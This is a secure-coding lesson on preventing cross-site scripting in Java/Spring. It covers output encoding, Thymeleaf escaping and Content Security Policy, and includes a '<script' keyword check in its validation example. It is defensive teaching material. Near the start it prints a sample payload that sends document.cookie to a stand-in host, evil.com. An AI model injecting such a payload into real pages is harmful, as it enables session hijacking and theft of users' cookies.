# XSS Prevention

## Learning Objectives

- Understand Cross-Site Scripting (XSS) attacks
- Identify XSS vulnerabilities in code
- Apply output encoding to prevent XSS
- Use Content Security Policy for defense in depth

## Why This Matters

XSS allows attackers to inject malicious scripts into pages viewed by other users. It can lead to session hijacking, data theft, and defacement.

## The Concept

### What is XSS?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into content that gets executed by other users' browsers.

```
Attacker Input: <script>document.location='http://evil.com/steal?c='+document.cookie</script>

If not sanitized, this script runs in victim's browser, stealing cookies.
```

### Types of XSS

| Type | Description | Example |
|------|-------------|---------|
| **Stored** | Malicious script saved in database | Comment with script tag |
| **Reflected** | Script in URL parameter | Error message reflecting input |
| **DOM-based** | Client-side JavaScript manipulation | URL fragment injection |

### Prevention: Output Encoding

The primary defense: encode user data before rendering.

```java
// ❌ Vulnerable
String html = "<p>Welcome, " + username + "</p>";

// ✅ Secure with encoding
String html = "<p>Welcome, " + HtmlUtils.htmlEscape(username) + "</p>";

// What encoding does:
// <script>alert('xss')</script>
// becomes:
// &lt;script&gt;alert('xss')&lt;/script&gt;
// Browser displays it as text, doesn't execute
```

### Context-Specific Encoding

| Context | Encoding Needed | Example |
|---------|-----------------|---------|
| HTML body | HTML entity encode | `&lt;` for `<` |
| HTML attribute | Attribute encode | `&#x22;` for `"` |
| JavaScript | JavaScript encode | `\x3c` for `<` |
| URL | URL encode | `%3C` for `<` |
| CSS | CSS encode | `\3c` for `<` |

### Spring/Thymeleaf Protection

Thymeleaf escapes by default:

```html
<!-- ✅ Automatically escaped -->
<p th:text="${userInput}"></p>
<!-- Result: <p>&lt;script&gt;...&lt;/script&gt;</p> -->

<!-- ❌ Unescaped (dangerous) -->
<p th:utext="${userInput}"></p>
<!-- Only use if content is guaranteed safe -->
```

### API Response Encoding

```java
// For JSON APIs, use proper serialization
@GetMapping("/user/{id}")
public ResponseEntity<UserDTO> getUser(@PathVariable Long id) {
    // Jackson handles JSON encoding automatically
    return ResponseEntity.ok(userService.findById(id));
}

// Set proper content type
response.setContentType("application/json");
```

### Content Security Policy (CSP)

Defense in depth—restrict what scripts can run:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data:;"
            )
        )
    );
    return http.build();
}
```

### Additional Headers

```java
http.headers(headers -> headers
    .xssProtection(xss -> xss
        .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
    )
    .contentTypeOptions(Customizer.withDefaults())  // X-Content-Type-Options: nosniff
);
```

### Input Validation (Additional Layer)

```java
public void validateComment(String comment) {
    // Reject obvious attacks (defense in depth)
    if (comment.toLowerCase().contains("<script")) {
        throw new InvalidInputException("Invalid content");
    }
    
    // Whitelist approach for rich text
    String sanitized = Jsoup.clean(comment, Safelist.basic());
}
```

### Common Mistakes

| Mistake | Fix |
|---------|-----|
| Using innerHTML directly | Use textContent or proper encoding |
| Trusting client input | Always validate server-side |
| Disabling escaping | Keep escaping enabled |
| Missing CSP | Implement CSP headers |
| Only checking script tags | Encode all user output |

## Summary

- XSS injects malicious scripts that run in other users' browsers
- Primary defense: output encoding appropriate to context
- Use frameworks that escape by default (Thymeleaf, React)
- Implement Content Security Policy as defense in depth
- Never trust user input—validate and encode

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
